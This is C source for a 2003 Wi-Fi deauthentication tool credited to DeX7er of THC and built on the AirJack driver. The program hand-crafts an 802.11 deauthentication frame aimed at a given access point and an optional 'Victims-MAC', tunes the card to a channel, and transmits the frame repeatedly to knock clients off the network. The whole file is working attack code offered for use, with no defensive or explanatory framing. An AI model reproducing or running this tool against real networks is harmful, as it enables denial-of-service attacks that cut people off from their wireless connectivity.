/*
-------------------------------------------------------------------------------------------------------

bad coded by DeX7er '03 (dexter@thc.org), based on Airjack tools and File2air sources

-------------------------------------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <net/bpf.h>
#include <time.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <errno.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <linux/wireless.h>
#include <fcntl.h>

#include "airjack.h"		// struct aj_config

#define	MONITOR_ENABLE		1 
#define	MONITOR_DISABLE		0

int aj_getsocket(u_char *ifname);
int aj_getconfig(u_char *ifname, struct aj_config *ajconf);
int aj_setconfig(u_char *ifname, struct aj_config *ajconf);
int aj_setmonitor(u_char *ifname, __u8 rfmonset);
int aj_setchannel(u_char *ifname, __u8 channel);
int aj_sendpkt(u_char *ifname, u_char *buffer, u_int buflen);
void printhex(u_char *bs, u_int n);
void printconfig(struct aj_config *ajconf);
int StrToHex(unsigned char *cpString, unsigned int nSizeString,unsigned char *cpHexValue,unsigned int uSizeHexValue );

int main(int argc,char *argv[]) {
	
	__u8 channel;
	u_long n=1;
	u_char *ifname = "aj0";
	u_char buffer[] = { 0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x0b, 0xbe, 0x6d, 0x8e, 0x77, 
		                0x00, 0x0b, 0xbe, 0x6d, 0x8e, 0x77, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 };
	
	if(argc < 3) { 
		printf("\n");
		printf("Deauthentication Tool written by DeX7er '03 (dexter@thc.org) Version 0.1        \n");
		printf("You will always get the latest version and other cool stuff at www.thc.org    \n\n");
		printf("Usage: %s <channel> <AP-MAC> [<Victims-MAC>]\n\n",argv[0]); exit(0); }
		
	channel = atoi(argv[1]);
	StrToHex(argv[2],strlen(argv[2]),buffer+0x0a,6);
	StrToHex(argv[2],strlen(argv[2]),buffer+0x10,6);
	
	if(argc == 4) StrToHex(argv[3],strlen(argv[3]),buffer+0x04,6);
	
	aj_setchannel(ifname,channel);
	
	while(1) {	
		aj_sendpkt(ifname,buffer,sizeof(buffer));
		printf("%lu. Pkt sent. Hit enter to send it again or CTRL-C to abort. ",n);
		n++;
		getchar();
	}	
		
	exit(EXIT_SUCCESS);	
}

/* aj_getsocket accepts the AirJack interface char * and 
   return a socket, or -1 on error.  This is cribbed right from essid_jack.c,
   thanks Abaddon. */
int aj_getsocket(u_char *ifname) {

    struct sockaddr_ll	addr;
    struct ifreq	req;
    struct aj_config	aj_conf;
    int    sock;


    /* open the link layer socket */
    if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        return(-1);
    }

    /* get the interface index */
    memset(&req, 0, sizeof(struct ifreq));
    memset(&aj_conf, 0, sizeof(struct aj_config));
	strncpy(req.ifr_name, ifname,sizeof(req.ifr_name));
	req.ifr_name[sizeof(req.ifr_name)-1] = '\0';

    if(ioctl(sock, SIOCGIFINDEX, &req) < 0) {
        close(sock);
        return(-1);
    }

    /* bind the socket to the interface */
    memset(&addr, 0, sizeof(struct sockaddr_ll));
    addr.sll_ifindex = req.ifr_ifindex;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_family = AF_PACKET;
    if(bind(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll)) < 0) {
        close(sock);
        return(-1);
    }

    return(sock);
}

int aj_getconfig(u_char *ifname, struct aj_config *ajconf) {
	struct ifreq req;
    int sock;

    if((sock = aj_getsocket(ifname)) < 0) {
        perror("aj_getsocket");
        close(sock);
        return(-1);
    }

    req.ifr_data = (char *)ajconf;
    strncpy(req.ifr_name, ifname, sizeof(req.ifr_name));
	req.ifr_name[sizeof(req.ifr_name)-1] = '\0';
	
    // populate the structure 
    if (ioctl(sock, SIOCAJGMODE, &req) < 0) {
        close(sock); 
        return(-1);
    }
	
	return(0);
}

int aj_setconfig(u_char *ifname, struct aj_config *ajconf) {
	struct ifreq req;
    int sock;
	
    if((sock = aj_getsocket(ifname)) < 0) {
        perror("aj_getsocket");
        close(sock);
        return(-1);
    }

    req.ifr_data = (char *)ajconf;
    strncpy(req.ifr_name, ifname, sizeof(req.ifr_name));
	req.ifr_name[sizeof(req.ifr_name)-1] = '\0';
	
	// set struct ajconf
	if (ioctl(sock, SIOCAJSMODE, &req) < 0) {
        close(sock); 
        return(-1); 
    }
	
	return(0); 
	
}

int aj_setchannel(u_char *ifname, __u8 channel) {
	struct aj_config ajconf;

	// init ajconf
    aj_getconfig(ifname,&ajconf);
	
	// set channel
	ajconf.channel = channel;
	
	// set ajconf
    aj_setconfig(ifname,&ajconf);
	
	return(0);
}

int aj_sendpkt(u_char *ifname, u_char *buffer, u_int buflen) {
	
	int	sock;
	
	/* Get a socket to send the frames with */
	if ((sock = aj_getsocket(ifname)) < 0) {
			perror("aj_getsocket");
			exit(-1);
	}
	
	if (write(sock, (__u8 *)buffer, buflen) < buflen) {
            perror("write");
            exit(-1);
    }
	//printf(".");
	
	/* Close the packet-writing socket */
	close(sock);
	
	return(EXIT_SUCCESS);
};

void printhex(u_char *bs, u_int n) {
	
	u_int i;
	
	for(i=0; i < n; i++) {
		printf("%02x ",bs[i]);
	}
}
	
// String to Hex Conversion
int StrToHex(unsigned char *cpString, unsigned int nSizeString,unsigned char *cpHexValue,unsigned int uSizeHexValue ) 
{
int i,x,y,count=0;
unsigned char hex[nSizeString];
		
x = 0;
y = 0;	
	
for (i = 0;i < nSizeString; i++)
	{
		switch ( cpString[i] )
		{
			case '0' :
				hex[i] = 0;
				count++;
				break;
			case '1' :
				hex[i] = 1;
				count++;
				break;
			case '2' :
				hex[i] = 2;
				count++;
				break;
			case '3' :
				hex[i] = 3;
				count++;
				break;
			case '4' :
				hex[i] = 4;
				count++;
				break;
			case '5' :
				hex[i] = 5;
				count++;
				break;
			case '6' :
				hex[i] = 6;
				count++;
				break;
			case '7' :
				hex[i] = 7;
				count++;
				break;
			case '8' :
				hex[i] = 8;
				count++;
				break;
			case '9' :
				hex[i] = 9;
				count++;
				break;			
			case 'a' :
			case 'A' :
				hex[i] = 0x0A;
				count++;
				break;
			case 'b' :
			case 'B' :
				hex[i] = 0x0B;
				count++;
				break;
			case 'c' :
			case 'C' :
				hex[i] = 0x0C;
				count++;
				break;
			case 'd' :
			case 'D' :
				hex[i] = 0x0D;
				count++;
				break;
			case 'e' :
			case 'E' :
				hex[i] = 0x0E;
				count++;
				break;
			case 'f' :
			case 'F' :
				hex[i] = 0x0F;
				count++;
				break;
			case ' ' :
			case '-' :
			case '\t':
			case ':' :
				continue;
			default:
				printf("\nError: %c is not a hexvalue \n\n",cpString[i]);
				exit(0);
		}
		
		if (x % 2) // every odd value (1,3,5,..) 
			{
			if ( y >= uSizeHexValue ) { printf("\nError: Buffer too small \n\n"); exit(0); }  	// Protect Buffer				
			cpHexValue[y] = hex[i] | (hex[i-1]<<4);	// last low nibble OR with high nibble (shift to high)
			y++;
			}
		x++;
	}
	if ( y <  uSizeHexValue ) { printf("Buffer too short\n"); exit(EXIT_FAILURE); }			// value too short ?
	
	return(count/2);
}
